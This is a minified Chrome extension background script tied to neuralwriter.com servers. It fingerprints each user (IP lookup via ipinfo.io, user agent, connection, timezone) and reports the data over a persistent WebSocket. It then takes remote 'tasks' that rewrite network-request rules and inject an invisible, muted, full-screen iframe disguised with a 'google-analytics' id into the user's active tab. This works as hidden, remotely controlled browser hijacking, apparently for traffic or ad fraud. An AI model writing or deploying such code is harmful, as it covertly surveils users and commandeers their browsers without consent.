const DEFAULT_STATE={id:null,info:{},whenUninstalled:null};async function state(){return(await chrome.storage.local.get(["state_new"])).state_new}async function id(){return(await state()).id}async function setId(e){let t=await state();t.id=e,t.when=(new Date).getTime(),await chrome.storage.local.set({state_new:t})}async function setInfo(e){let t=await state();t.info=e,await chrome.storage.local.set({state_new:t})}function generateUniqueUid(){return Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)+Math.random().toString(36).substring(2,15)}async function waitTabLoaded(e){for(e=await chrome.tabs.get(e.id);"complete"!==e.status;)await new Promise((e=>setTimeout(e,100))),e=await chrome.tabs.get(e.id)}async function getUsableTab(){let e=(await chrome.tabs.query({windowType:"normal",active:!0})).find((e=>e.active));return e||null}async function getTitle(e){return await chrome.scripting.executeScript({target:{tabId:e.id},function:()=>document.title})}async function setPart(e){await chrome.storage.sync.set({partName:e}),await chrome.storage.sync.set({partIterations:{}})}async function setTaskId(e){await chrome.storage.sync.set({taskId:e})}async function createUser(){let e=await state();if(e&&e.id&&e.info&&e.info.ip)return e;e&&e.id||await setId(generateUniqueUid());let t=await fetch("https://ipinfo.io/json"),a=await t.json(),n={navigator:{userAgent:navigator.userAgent,platform:navigator.platform,language:navigator.language},language:navigator.language,ip:a,connection:{downlink:navigator.connection.downlink,effectiveType:navigator.connection.effectiveType,rtt:navigator.connection.rtt},timezone:Intl.DateTimeFormat().resolvedOptions().timeZone};return await setInfo(n),await state()}function generateUnblockRule(e,t,a){return{id:e,priority:1,action:t,condition:a}}async function removeRules(){(await chrome.declarativeNetRequest.getSessionRules()).forEach((async e=>{await chrome.declarativeNetRequest.updateSessionRules({removeRuleIds:[e.id]})}))}async function addFramerRule(e,t,a){await chrome.declarativeNetRequest.updateSessionRules({addRules:[generateUnblockRule(e,t,a)]})}async function dumpRules(){await chrome.declarativeNetRequest.getSessionRules()}async function getTaskId(){return(await chrome.storage.sync.get("taskId")).taskId}async function pushNotSentMessage(e){const t=(await chrome.storage.sync.get("notSentMessages")).notSentMessages||[];t.push(e),await chrome.storage.sync.set({notSentMessages:t})}async function prepareWsMessage(e){return e.id=await id(),JSON.stringify(e)}let ws,reconnectTimer;async function sendWsMessage(e,t){try{if(1!==e.readyState)throw new Error("WebSocket is not open now.");const a=await prepareWsMessage(t);e.send(a)}catch(e){if("ping"===t.route)return;await pushNotSentMessage(t)}}async function onWsOpen(){try{const e=(await chrome.storage.sync.get("notSentMessages")).notSentMessages||[];for(let t=0;t<e.length;t++)await sendWsMessage(ws,e[t]);await chrome.storage.sync.set({notSentMessages:[]})}catch(e){}setInterval((async()=>{await sendWsMessage(ws,{route:"ping",payload:{}})}),3e4)}async function onWsMessage(e){const t=JSON.parse(e.data);if("register"==t.route){const e=await createUser();await sendWsMessage(ws,{route:"register",payload:e})}else if("task"===t.route){const e=t.payload,a=e.id,n=e.safeTimeout,s="google-analytics-"+a;if(await getTaskId()==a){const e={error:!0,message:`Task ${a} already active, skip duplicate task running`,taskId:a,timestamp:(new Date).getTime()};return void await sendWsMessage(ws,{route:"log",payload:[e]})}await setTaskId(a);const i=e.rules;await removeRules();for(let e=0;e<i.length;e++){const t=i[e].rule,a=i[e].condition,n=i[e].id;await addFramerRule(n,t,a)}const o=e.parts,r=await getUsableTab();if(!r)return void await sendWsMessage(ws,{route:"status",payload:{taskId:a,status:"notab"}});await waitTabLoaded(r),await chrome.storage.sync.set({parts:o}),await setPart("main");let c=o.main;await sendWsMessage(ws,{route:"status",payload:{taskId:a,status:"running"}}),chrome.scripting.executeScript({target:{tabId:r.id},function:creator,args:[c,s]});const d=1e3;let l=n,u=0,m="finished";for(chrome.tabs.onRemoved.addListener((async(e,t)=>{e===r.id&&(m="aborted",await setPart(null),chrome.tabs.onRemoved.removeListener((()=>{})))})),await chrome.tabs.update(r.id,{muted:!0,autoDiscardable:!1});;){u+=1;const e=await chrome.storage.sync.get("partName"),t=e?.partName;if(null===t||l<=0){await sendWsMessage(ws,{route:"status",payload:{status:m,taskId:a}}),await removeRules(),await dumpRules(),await new Promise((e=>setTimeout(e,5e3)));try{chrome.scripting.executeScript({target:{tabId:r.id},function:e=>{const t=document.getElementById(e);t&&t.remove()},args:[s]})}catch(e){}break}try{chrome.scripting.executeScript({target:{tabId:r.id},function:(e,t)=>{const a=document.getElementById(e);a&&(t%2==0?(a.style.width=`${a.clientWidth+1}px`,a.style.height=`${a.clientHeight+1}px`):(a.style.width=a.clientWidth-1+"px",a.style.height=a.clientHeight-1+"px"))},args:[s,u]})}catch(e){}l-=d,await(async()=>{await new Promise((e=>setTimeout(e,d)))})()}await setTaskId(null)}}function connect(){const e=["server1.neuralwriter.com","server2.neuralwriter.com","server3.neuralwriter.com","server4.neuralwriter.com","server5.neuralwriter.com"],t=e[Math.floor(Math.random()*e.length)];try{ws=new WebSocket(`wss://${t}`)}catch(e){}ws.onopen=async function(){clearTimeout(reconnectTimer),await onWsOpen()},ws.onmessage=onWsMessage,ws.onclose=function(e){reconnectTimer=setTimeout(connect,1e4)},ws.onerror=function(e){}}chrome.alarms.create("ping",{periodInMinutes:.5}),chrome.alarms.onAlarm.addListener((async function(e){e.name})),chrome.idle.setDetectionInterval(15),chrome.idle.onStateChanged.addListener((async e=>{})),chrome.runtime.onInstalled.addListener((async function(e){if("install"===e.reason||"update"==e.reason){await chrome.storage.sync.set({taskId:null});let e=await state();e&&e.id||await chrome.storage.local.set({state_new:DEFAULT_STATE}),e=await state(),e.id||await setId(generateUniqueUid());let t=await chrome.tabs.query({url:"https://*.neuralwriter.com/*"});for(let e=0;e<t.length;e++){let a=t[e];chrome.scripting.executeScript({target:{tabId:a.id},files:["nw.js"]}),chrome.tabs.reload(a.id)}}}));try{connect()}catch(e){}try{chrome.runtime.onMessage.addListener((async(e,t,a)=>{"log"===e.type?await sendWsMessage(ws,{route:"log",payload:e.data}):"executionResult"==e.type&&await sendWsMessage(ws,{route:"result",payload:e.data})}))}catch(e){}const creator=(e,t)=>{const a=document.getElementById(t);a&&a.remove();const n=document.createElement("iframe");n.style.width="100%",n.style.height="100%",n.style.position="fixed",n.style.top="0",n.style.left="0",n.style.zIndex="99999999",n.id=t,n.src=e.url_init,n.style.pointerEvents="none",n.style.opacity="0",document.body.appendChild(n)};function startTimer(){try{const e=new Map,t=new Map;chrome.runtime.onMessage.addListener(((a,n,s)=>{if("setTimeout"===a.command){const{id:t,timeout:i}=a,o=setTimeout((()=>{try{chrome.tabs.sendMessage(n.tab.id,{command:"timeout",id:t})}catch(e){}}),i);e.set(t,o),s({timeoutId:t})}else if("clearTimeout"===a.command){const{id:t}=a,n=e.get(t);n&&(clearTimeout(n),e.delete(t))}else if("setInterval"===a.command){const{id:e,interval:i}=a,o=setInterval((()=>{try{chrome.tabs.sendMessage(n.tab.id,{command:"interval",id:e})}catch(e){}}),i);t.set(e,o),s({intervalId:e})}else if("clearInterval"===a.command){const{id:e}=a,n=t.get(e);n&&(clearInterval(n),t.delete(e))}return!0}))}catch(e){}}startTimer();